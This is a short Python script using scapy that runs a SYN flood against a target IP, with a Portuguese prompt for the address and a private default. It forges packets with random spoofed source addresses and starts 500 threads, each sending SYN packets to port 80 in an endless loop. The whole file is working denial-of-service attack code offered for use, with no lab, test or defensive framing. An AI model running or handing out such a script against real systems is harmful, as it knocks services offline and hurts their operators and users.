from scapy.all import *
import random
from threading import Thread

from scapy.layers.inet import TCP, IP

dst_IP = "172.21.209.231"
PORT = 80


def random_PORT():
    return random.randint(1058, 40000)


def SYN_Flood():
    while True:

        try:

            ip_pkg = IP()
            ip_pkg.src = RandIP()
            ip_pkg.dst = dst_IP

            src_PORT = random_PORT()

            tcp_pkg = TCP()
            tcp_pkg.sport = src_PORT
            tcp_pkg.dport = PORT
            tcp_pkg.flags = "S"

            pkg = ip_pkg / tcp_pkg
            send(pkg, verbose=0)

        except:
            thread = Thread(target=SYN_Flood)


if __name__ == "__main__":

    ip = input("Digite o IP destinatario do ataque SYNflood (default: 172.21.209.231): ")

    if len(ip) > 1:
        dst_IP = ip

    print(f"\n(*) IP destinatario: {dst_IP}")

    for i in range(0, 500):
        thread = Thread(target=SYN_Flood)
        thread.start()
